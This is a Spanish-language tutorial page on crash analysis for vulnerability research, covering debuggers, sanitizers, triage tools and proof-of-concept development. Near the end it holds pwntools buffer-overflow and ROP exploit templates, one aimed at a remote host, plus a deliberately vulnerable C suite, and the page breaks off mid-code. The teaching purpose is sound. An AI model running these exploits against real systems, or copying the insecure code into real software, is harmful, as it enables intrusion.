<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capítulo 5: Análisis de Crashes | Red Team Logbook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
:root {--crimson:#DC143C;--crimson-dark:#8B0000;--crimson-glow:rgba(220,20,60,0.6);--gray-900:#0a0a0a;--gray-800:#1a1a1a;--gray-700:#2d2d2d;--gray-600:#404040;--gray-500:#525252;--gray-400:#737373;--gray-300:#a3a3a3;--gray-200:#d4d4d4;--white:#fff;--green:#39ff14;--mono:'Fira Code',monospace;--sidebar:280px;--header:70px;}
* {margin:0;padding:0;box-sizing:border-box;}
body {font-family:var(--mono);background:var(--gray-900);color:var(--gray-200);line-height:1.7;min-height:100vh;}
.bg {position:fixed;top:0;left:0;width:100%;height:100%;z-index:-2;background:linear-gradient(135deg,rgba(10,10,10,0.95),rgba(26,26,26,0.9)),url('images/image-000.jpg');background-size:cover;background-position:center;}
.bg::before {content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.1) 0,rgba(0,0,0,0.1) 1px,transparent 1px,transparent 3px);}
.header {position:fixed;top:0;left:0;right:0;height:var(--header);background:linear-gradient(180deg,rgba(10,10,10,0.98),rgba(26,26,26,0.95));backdrop-filter:blur(10px);border-bottom:1px solid rgba(220,20,60,0.3);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 30px;}
.logo {display:flex;align-items:center;gap:15px;}
.logo-icon {width:40px;height:40px;background:linear-gradient(135deg,var(--crimson),var(--crimson-dark));border-radius:8px;display:flex;align-items:center;justify-content:center;color:var(--white);box-shadow:0 0 20px var(--crimson-glow);}
.logo-text {font-size:1.1rem;font-weight:600;color:var(--white);letter-spacing:1px;}
.logo-text span {color:var(--crimson);}
.home-btn {display:flex;align-items:center;justify-content:center;width:36px;height:36px;background:rgba(45,45,45,0.8);border:1px solid var(--gray-600);border-radius:8px;color:var(--gray-300);text-decoration:none;transition:all 0.3s;margin-left:15px;}
.home-btn:hover {background:var(--crimson);border-color:var(--crimson);color:var(--white);box-shadow:0 0 15px var(--crimson-glow);}
.controls {display:flex;align-items:center;gap:20px;}
.search {position:relative;}
.search input {background:rgba(45,45,45,0.8);border:1px solid rgba(220,20,60,0.3);border-radius:8px;padding:8px 15px;padding-right:40px;color:var(--gray-200);font-family:var(--mono);font-size:0.85rem;width:200px;transition:all 0.3s;}
.search input:focus {outline:none;border-color:var(--crimson);box-shadow:0 0 15px rgba(220,20,60,0.3);width:260px;}
.search button {position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--gray-400);cursor:pointer;}
.search button:hover {color:var(--crimson);}
.lang-btn {background:transparent;border:1px solid var(--gray-600);color:var(--gray-300);padding:6px 14px;border-radius:6px;font-family:var(--mono);font-size:0.75rem;cursor:pointer;transition:all 0.3s;text-transform:uppercase;text-decoration:none;letter-spacing:1px;}
.lang-btn:hover {background:var(--crimson);border-color:var(--crimson);color:var(--white);box-shadow:0 0 15px var(--crimson-glow);}
.menu-btn {display:none;background:transparent;border:1px solid var(--gray-600);color:var(--gray-200);padding:8px 12px;border-radius:6px;cursor:pointer;}
.sidebar {position:fixed;top:var(--header);left:0;width:var(--sidebar);height:calc(100vh - var(--header));background:linear-gradient(180deg,rgba(10,10,10,0.98),rgba(26,26,26,0.95));border-right:1px solid rgba(220,20,60,0.2);overflow-y:auto;z-index:900;padding:30px 20px;}
.sidebar-title {font-size:0.7rem;text-transform:uppercase;letter-spacing:3px;color:var(--gray-500);margin-bottom:20px;padding-bottom:10px;border-bottom:1px solid rgba(220,20,60,0.2);}
.toc-link {display:flex;align-items:center;gap:12px;padding:12px 15px;color:var(--gray-300);text-decoration:none;border-radius:8px;margin-bottom:8px;transition:all 0.3s;font-size:0.85rem;}
.toc-link:hover {background:rgba(220,20,60,0.1);color:var(--white);transform:translateX(5px);}
.toc-link.active {background:linear-gradient(135deg,rgba(220,20,60,0.2),rgba(220,20,60,0.1));color:var(--crimson);border-left:3px solid var(--crimson);}
.chapter-num {font-size:0.7rem;font-weight:700;color:var(--crimson);background:rgba(220,20,60,0.1);padding:4px 8px;border-radius:30px;}
.chapter-title {flex:1;}
.overlay {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:850;}
.content {margin-left:var(--sidebar);margin-top:var(--header);min-height:calc(100vh - var(--header));padding:40px 50px;}
.wrapper {max-width:900px;margin:0 auto;}
.article {background:linear-gradient(135deg,rgba(26,26,26,0.95),rgba(45,45,45,0.9));border:1px solid rgba(220,20,60,0.2);border-radius:16px;padding:50px;box-shadow:0 10px 40px rgba(0,0,0,0.5),0 0 30px rgba(220,20,60,0.1);}
.article h1 {font-size:2.2rem;color:var(--white);margin-bottom:30px;padding-bottom:15px;border-bottom:2px solid var(--crimson);}
.article h2 {font-size:1.6rem;color:var(--crimson);margin-top:40px;margin-bottom:20px;padding-left:15px;border-left:3px solid var(--crimson);}
.article h3 {font-size:1.3rem;color:var(--gray-100);margin-top:30px;margin-bottom:15px;}
.article p {margin-bottom:20px;color:var(--gray-200);text-align:justify;}
.article a {color:var(--crimson);text-decoration:none;transition:all 0.3s;border-bottom:1px solid transparent;}
.article a:hover {color:#ff4444;border-bottom-color:#ff4444;}
.article ul,.article ol {margin-bottom:20px;padding-left:30px;}
.article li {margin-bottom:10px;}
.article code {font-family:var(--mono);background:rgba(220,20,60,0.1);color:#ff4444;padding:2px 8px;border-radius:4px;font-size:0.9em;}
.article pre {background:var(--gray-900);border:1px solid rgba(220,20,60,0.3);border-radius:8px;padding:20px;overflow-x:auto;margin:20px 0;}
.article pre code {background:none;padding:0;color:var(--green);}
.article table {width:100%;border-collapse:collapse;margin:25px 0;}
.article th {background:linear-gradient(135deg,var(--crimson-dark),var(--crimson));color:var(--white);padding:15px;text-align:left;font-weight:600;text-transform:uppercase;font-size:0.8rem;}
.article td {padding:12px 15px;border-bottom:1px solid rgba(220,20,60,0.1);}
.article tr:hover {background:rgba(220,20,60,0.05);}
.highlight {background:var(--crimson);color:var(--white);padding:2px 6px;border-radius:3px;}
.nav {display:flex;justify-content:space-between;align-items:center;margin-top:40px;padding-top:30px;border-top:1px solid rgba(220,20,60,0.2);}
.nav-btn {display:flex;align-items:center;gap:10px;padding:12px 25px;background:linear-gradient(135deg,rgba(220,20,60,0.2),rgba(220,20,60,0.1));border:1px solid rgba(220,20,60,0.3);border-radius:8px;color:var(--gray-200);text-decoration:none;font-size:0.85rem;transition:all 0.3s;}
.nav-btn:hover {background:linear-gradient(135deg,var(--crimson),var(--crimson-dark));border-color:var(--crimson);color:var(--white);box-shadow:0 0 20px var(--crimson-glow);transform:translateY(-2px);}
.nav-home {background:linear-gradient(135deg,rgba(45,45,45,0.8),rgba(26,26,26,0.8));border-color:var(--gray-600);}
.nav-home:hover {background:linear-gradient(135deg,var(--gray-600),var(--gray-700));border-color:var(--gray-400);box-shadow:0 0 15px rgba(255,255,255,0.1);}
.footer {text-align:center;padding:30px;color:var(--gray-500);font-size:0.8rem;border-top:1px solid rgba(220,20,60,0.1);margin-top:50px;}
.footer a {color:var(--crimson);text-decoration:none;}
@media(max-width:1024px){.sidebar{transform:translateX(-100%)}.sidebar.active{transform:translateX(0)}.overlay.active{display:block}.content{margin-left:0;padding:30px 20px}.menu-btn{display:block}}
@media(max-width:768px){.header{padding:0 15px}.logo-text{display:none}.search{display:none}.content{padding:20px 15px}.article{padding:30px 20px}.article h1{font-size:1.6rem}.article h2{font-size:1.3rem}.nav{flex-wrap:wrap;gap:15px}.nav-btn{flex:1;justify-content:center;min-width:100px}}
@media(max-width:480px){.article{padding:20px 15px;border-radius:12px}.article h1{font-size:1.4rem}.nav{flex-direction:column}.nav-btn{width:100%;justify-content:center}}
</style>
</head>
<body>
    <div class="bg"></div>
    <header class="header">
        <div class="logo">
            <button class="menu-btn"><i class="fas fa-bars"></i></button>
            <div class="logo-icon"><i class="fas fa-skull"></i></div>
            <div class="logo-text">RED<span>TEAM</span> LOG</div>
            <a href="../../../" class="home-btn" title="Back to Home"><i class="fas fa-home"></i></a>
        </div>
        <div class="controls">
            <div class="search">
                <input type="text" id="searchbar" placeholder="Buscar...">
                <button id="search-btn"><i class="fas fa-search"></i></button>
            </div>
            <a href="../en/05-crash-analysis.html" class="lang-btn">English</a>
        </div>
    </header>
    <div class="overlay"></div>
    <nav class="sidebar">
        <div class="sidebar-title">Capítulos</div>
        <a href="01-introduccion.html" class="toc-link "><span class="chapter-num">01</span><span class="chapter-title">Introducción</span></a><a href="02-clases-vulnerabilidades.html" class="toc-link "><span class="chapter-num">02</span><span class="chapter-title">Clases de Vulnerabilidades</span></a><a href="03-fuzzing.html" class="toc-link "><span class="chapter-num">03</span><span class="chapter-title">Fuzzing</span></a><a href="04-patch-diffing.html" class="toc-link "><span class="chapter-num">04</span><span class="chapter-title">Patch Diffing</span></a><a href="05-analisis-crashes.html" class="toc-link active"><span class="chapter-num">05</span><span class="chapter-title">Análisis de Crashes</span></a>
    </nav>
    <main class="content">
        <div class="wrapper">
            <article class="article"><h1>Capítulo 5: Análisis de Crashes</h1>
<p>Después de encontrar vulnerabilidades potenciales mediante fuzzing o patch diffing, el siguiente paso crítico es analizar crashes para determinar si son explotables. Este capítulo cubre triage de crashes, dominio de depuradores, sanitizers de memoria y técnicas avanzadas de análisis de causa raíz.</p>
<h2>5.1. 4.1 Fundamentos del Análisis de Crashes</h2>
<p>El análisis de crashes es el proceso de transformar un crash descubierto por un fuzzer en conocimiento accionable sobre una vulnerabilidad. Esto incluye determinar la causa raíz, evaluar explotabilidad, y desarrollar pruebas de concepto.</p>
<h3>5.1.1. Árbol de Decisión para Análisis de Crashes</h3>
<ol>
<li><strong>CRASH RECIBIDO:</strong> ¿Es reproducible?</li>
<li><strong>CÓDIGO FUENTE:</strong> ¿Disponible?</li>
<li><strong>SANITIZERS:</strong> Recompilar con ASAN/UBSAN si hay fuente.</li>
<li><strong>DEPURADOR:</strong> Usar GDB/WinDbg si no hay fuente.</li>
<li><strong>CLASIFICAR:</strong> Usar CASR para clasificar la vulnerabilidad.</li>
<li><strong>MINIMIZAR:</strong> Reducir el input de crash.</li>
<li><strong>PoC:</strong> Desarrollar una prueba de concepto.</li>
</ol>
<h2>5.2. 4.2 Depuradores y Configuración</h2>
<h3>5.2.1. WinDbg Preview para Windows</h3>
<p>WinDbg Preview es el depurador estándar para análisis de crashes en Windows, con capacidades avanzadas de Time Travel Debugging.</p>
<p><strong>Instalación:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c"># Instalar desde Microsoft Store o winget</span>
<span class="n">winget</span> <span class="n">install</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">WinDbgPreview</span>

<span class="c"># Crear directorio de símbolos</span>
<span class="n">mkdir</span> <span class="n">C</span><span class="p">:\</span><span class="n">Symbols</span>

<span class="c"># Configurar symbol path</span>
<span class="no">[Environment]</span><span class="p">::</span><span class="n">SetEnvironmentVariable</span><span class="p">(</span>
    <span class="s2">&quot;NT_SYMBOL_PATH&quot;</span><span class="p">,</span>
    <span class="s2">&quot;SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols&quot;</span><span class="p">,</span>
    <span class="s2">&quot;User&quot;</span>
<span class="p">)</span>
</code></pre></div>

<p><strong>Comandos Esenciales de WinDbg:</strong></p>
<table>
<thead>
<tr>
<th>Comando</th>
<th>Propósito</th>
<th>Ejemplo</th>
</tr>
</thead>
<tbody>
<tr>
<td>!analyze -v</td>
<td>Análisis automático de crash</td>
<td>N/A</td>
</tr>
<tr>
<td>k / kp / kv</td>
<td>Stack trace</td>
<td>kv 20</td>
</tr>
<tr>
<td>r</td>
<td>Mostrar registros</td>
<td>r rax, rbx</td>
</tr>
<tr>
<td>u / ub</td>
<td>Disassembly</td>
<td>u rip L10</td>
</tr>
<tr>
<td>d / db / dq</td>
<td>Dump de memoria</td>
<td>dq rsp L8</td>
</tr>
<tr>
<td>!heap</td>
<td>Análisis del heap</td>
<td>!heap -s</td>
</tr>
<tr>
<td>!address</td>
<td>Info de memoria</td>
<td>!address rsp</td>
</tr>
<tr>
<td>lm</td>
<td>Listar módulos</td>
<td>lm vm ntdll</td>
</tr>
<tr>
<td>.ecxr</td>
<td>Contexto de excepción</td>
<td>N/A</td>
</tr>
</tbody>
</table>
<p><strong>Time Travel Debugging (TTD):</strong>
TTD permite grabar la ejecución completa de un proceso y reproducirla.</p>
<div class="codehilite"><pre><span></span><code><span class="c"># Grabar ejecución</span>
<span class="n">tttracer</span><span class="p">.</span><span class="n">exe</span> <span class="n">-out</span> <span class="n">C</span><span class="p">:\</span><span class="n">Traces</span> <span class="n">-launch</span> <span class="n">target</span><span class="p">.</span><span class="n">exe</span> <span class="n">crash_input</span><span class="p">.</span><span class="n">txt</span>

<span class="c"># Comandos TTD</span>
<span class="p">!</span><span class="n">tt</span> <span class="n">0</span>           <span class="c"># Ir al inicio</span>
<span class="p">!</span><span class="n">tt</span> <span class="n">100</span>         <span class="c"># Ir al final</span>
<span class="n">g</span><span class="p">-</span>              <span class="c"># Ejecutar hacia atrás</span>
<span class="n">p</span><span class="p">-</span>              <span class="c"># Step back</span>
</code></pre></div>

<h3>5.2.2. GDB + Pwndbg para Linux</h3>
<p>Pwndbg es una extensión de GDB diseñada para análisis de vulnerabilidades.</p>
<p><strong>Instalación:</strong></p>
<div class="codehilite"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/pwndbg/pwndbg
<span class="nb">cd</span><span class="w"> </span>pwndbg
./setup.sh
pip<span class="w"> </span>install<span class="w"> </span>pwntools<span class="w"> </span>ropper<span class="w"> </span>capstone<span class="w"> </span>keystone-engine
</code></pre></div>

<p><strong>Configuración de Core Dumps:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">ulimit</span><span class="w"> </span>-c<span class="w"> </span>unlimited
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;core. %e. %p. %t&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/proc/sys/kernel/core_pattern
</code></pre></div>

<p><strong>Comandos Esenciales de Pwndbg:</strong></p>
<table>
<thead>
<tr>
<th>Comando</th>
<th>Propósito</th>
</tr>
</thead>
<tbody>
<tr>
<td>context</td>
<td>Mostrar contexto completo</td>
</tr>
<tr>
<td>checksec</td>
<td>Verificar protecciones</td>
</tr>
<tr>
<td>vmmap</td>
<td>Mapa de memoria</td>
</tr>
<tr>
<td>telescope</td>
<td>Dereferencia inteligente</td>
</tr>
<tr>
<td>cyclic</td>
<td>Generar/buscar patrones</td>
</tr>
<tr>
<td>search</td>
<td>Buscar en memoria</td>
</tr>
<tr>
<td>heap</td>
<td>Análisis del heap</td>
</tr>
<tr>
<td>rop</td>
<td>Buscar gadgets ROP</td>
</tr>
</tbody>
</table>
<p><strong>Uso Típico:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>~/crash_analysis_lab
gdb<span class="w"> </span>-q<span class="w"> </span>./vuln_no_protect
pwndbg&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>args<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;A&#39;*100)&quot;</span><span class="k">)</span>
pwndbg&gt;<span class="w"> </span>run
pwndbg&gt;<span class="w"> </span>context
pwndbg&gt;<span class="w"> </span>bt
pwndbg&gt;<span class="w"> </span>telescope<span class="w"> </span><span class="nv">$rsp</span><span class="w"> </span><span class="m">20</span>
</code></pre></div>

<h3>5.2.3. Colección de Dumps</h3>
<p><strong>Windows - ProcDump:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c"># Configurar WER</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DumpFolder</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;C:\Dumps&quot;</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DumpType</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">2</span>

<span class="c"># Capturar dump</span>
<span class="n">procdump</span> <span class="n">-e</span> <span class="n">-ma</span> <span class="n">target</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">C</span><span class="p">:\</span><span class="n">Dumps</span>
</code></pre></div>

<p><strong>Linux - Core Dumps:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Habilitar</span>
<span class="nb">ulimit</span><span class="w"> </span>-c<span class="w"> </span>unlimited

<span class="c1"># Systemd-coredump</span>
sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>systemd-coredump
coredumpctl<span class="w"> </span>list
coredumpctl<span class="w"> </span>info<span class="w"> </span>MATCH
</code></pre></div>

<h3>5.2.4. PageHeap y AppVerifier (Windows)</h3>
<div class="codehilite"><pre><span></span><code><span class="c"># Habilitar PageHeap</span>
<span class="n">gflags</span> <span class="p">/</span><span class="n">p</span> <span class="p">/</span><span class="n">enable</span> <span class="n">target</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">full</span>

<span class="c"># Con AppVerifier</span>
<span class="n">appverif</span><span class="p">.</span><span class="n">exe</span>
<span class="c"># Agregar aplicación → Seleccionar checks (Heaps, Handles, Locks)</span>
</code></pre></div>

<h2>5.3. 4.3 Sanitizadores de Memoria</h2>
<p>Los sanitizers son herramientas de instrumentación que detectan bugs de memoria en tiempo de ejecución.</p>
<h3>5.3.1. AddressSanitizer (ASAN)</h3>
<p>ASAN detecta errores de memoria como desbordamientos y uso después de liberación.</p>
<p><strong>Compilación:</strong></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># GCC</span>
gcc<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>address<span class="w"> </span>-fno-omit-frame-pointer<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_asan

<span class="c1"># Clang</span>
clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>address<span class="w"> </span>-fno-omit-frame-pointer<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_asan
</code></pre></div>

<p><strong>Errores Detectados:</strong>
| Error | Descripción |
|-------|-------------|
| heap-buffer-overflow | Escritura fuera de bounds en heap |
| stack-buffer-overflow | Overflow de buffer en stack |
| use-after-free | Acceso después de free() |
| double-free | Doble liberación |</p>
<h3>5.3.2. UndefinedBehaviorSanitizer (UBSAN)</h3>
<div class="codehilite"><pre><span></span><code>clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>undefined<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_ubsan
</code></pre></div>

<h3>5.3.3. MemorySanitizer (MSAN)</h3>
<div class="codehilite"><pre><span></span><code>clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>memory<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_msan
</code></pre></div>

<h3>5.3.4. ThreadSanitizer (TSAN)</h3>
<div class="codehilite"><pre><span></span><code>clang<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>thread<span class="w"> </span>source.c<span class="w"> </span>-o<span class="w"> </span>target_tsan
</code></pre></div>

<h2>5.4. 4.4 Clasificación y Triage Automatizado</h2>
<h3>CASR - Crash Analysis and Severity Reporter</h3>
<div class="codehilite"><pre><span></span><code>cargo<span class="w"> </span>install<span class="w"> </span>casr
casr<span class="w"> </span>crash_dump<span class="w"> </span>--output<span class="w"> </span>report.json
</code></pre></div>

<p><strong>Clasificación:</strong>
- EXPLOITABLE: Control de RIP/EIP
- PROBABLY_EXPLOITABLE: Lectura fuera de límites
- NOT_EXPLOITABLE: Crash no explotable</p>
<h3>Minimización de Crashes</h3>
<div class="codehilite"><pre><span></span><code><span class="c1"># Con AFL</span>
afl-tmin<span class="w"> </span>-i<span class="w"> </span>crash_input<span class="w"> </span>-o<span class="w"> </span>minimized_input<span class="w"> </span>--<span class="w"> </span>./target
</code></pre></div>

<h2>5.5. 4.5 Análisis de Alcanzabilidad</h2>
<h3>DynamoRIO + drcov</h3>
<div class="codehilite"><pre><span></span><code>drrun<span class="w"> </span>-t<span class="w"> </span>drcov<span class="w"> </span>--<span class="w"> </span>./target<span class="w"> </span>input.txt
</code></pre></div>

<h3>Intel Processor Trace</h3>
<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>intel-pt-decoder
intel-pt-decoder<span class="w"> </span>--input<span class="w"> </span>trace.pt<span class="w"> </span>--output<span class="w"> </span>trace.txt
</code></pre></div>

<h3>Frida</h3>
<div class="codehilite"><pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>frida-tools
frida-trace<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;*malloc*&quot;</span><span class="w"> </span>./target
</code></pre></div>

<h3>rr - Record and Replay</h3>
<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>rr
rr<span class="w"> </span>record<span class="w"> </span>./target<span class="w"> </span>input.txt
rr<span class="w"> </span>replay
</code></pre></div>

<h2>5.6. 4.6 Desarrollo de PoC</h2>
<h3>pwntools - Framework de Explotación</h3>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>

<span class="c1"># Conexión</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;target.host&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
<span class="c1"># io = process(&#39;./vuln_binary&#39;)</span>

<span class="c1"># Offset hasta RIP</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="c1"># Construir payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
    <span class="n">p64</span><span class="p">(</span><span class="n">target_address</span><span class="p">)</span>
<span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<h3>PoC - Stack Buffer Overflow</h3>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;info&#39;</span><span class="p">)</span>

<span class="c1"># Generar crash y encontrar offset</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln_no_protect&#39;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">pc</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Offset: </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># Payload final</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">win_function</span><span class="p">)})</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>

<h2>5.7. 4.7 Proyecto Capstone</h2>
<h3>Suite de Pruebas Vulnerable</h3>
<div class="codehilite"><pre><span></span><code><span class="c1">// vulnerable_suite.c</span>
<span class="kt">void</span><span class="w"> </span><span class="nf">stack_overflow</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">  </span><span class="c1">// Sin verificación</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">heap_overflow</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span><span class="w">  </span><span class="c1">// Overflow</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">use_after_free</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span><span class="w">  </span><span class="c1">// UAF</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">double_free</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span><span class="w">  </span><span class="c1">// Double free</span>
<span class="p">}</span>
</code></pre></div>

<p><strong>Compilación:</strong></p>
<div class="codehilite"><pre><span></span><code>gcc<span class="w"> </span>-g<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-no-pie<span class="w"> </span>vulnerable_suite.c<span class="w"> </span>-o<span class="w"> </span>vuln_no_protect
gcc<span class="w"> </span>-g<span class="w"> </span>-O1<span class="w"> </span>-fsanitize<span class="o">=</span>address<span class="w"> </span>vulnerable_suite.c<span class="w"> </span>-o<span class="w"> </span>vuln_asan
</code></pre></div>

<h3>Explotación con ROP</h3>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln_no_protect&#39;</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
